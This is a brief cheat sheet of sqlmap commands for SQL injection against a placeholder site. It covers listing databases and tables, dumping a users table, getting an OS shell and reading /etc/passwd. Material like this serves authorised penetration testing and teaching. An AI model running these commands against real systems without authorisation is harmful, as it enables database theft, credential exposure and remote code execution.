# Basic test
sqlmap -u "http://site.com/page?id=1"

# Get database names
sqlmap -u "http://site.com/page?id=1" --dbs

# Get tables from a specific database
sqlmap -u "http://site.com/page?id=1" -D mydb --tables

# Dump data from a table
sqlmap -u "http://site.com/page?id=1" -D mydb -T users --dump

# Attempt to get an interactive OS shell
sqlmap -u "http://site.com/page?id=1" --os-shell

# Read a file
sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd"

# Test POST data (use Burp to capture the request and save to a file)
sqlmap -r request.txt